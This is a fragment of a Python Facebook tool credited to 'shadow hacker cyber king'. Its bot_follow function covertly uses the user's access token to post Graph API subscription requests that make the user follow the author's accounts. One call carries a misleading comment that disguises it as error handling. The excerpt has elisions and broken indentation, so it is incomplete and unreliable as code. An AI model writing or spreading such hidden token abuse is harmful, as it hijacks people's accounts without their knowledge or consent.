#!/usr/bin/python
# -*- coding: utf-8
# Facebook  : shadow hacker cyber king
...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/102537698751441/subscribers?access_token=' + toket)      #overlite overload periodic error
    	...
    	requests.post('https://graph.facebook.com/100008647622021/subscribers?access_token=' + toket) #CYBER KING
    	menu()
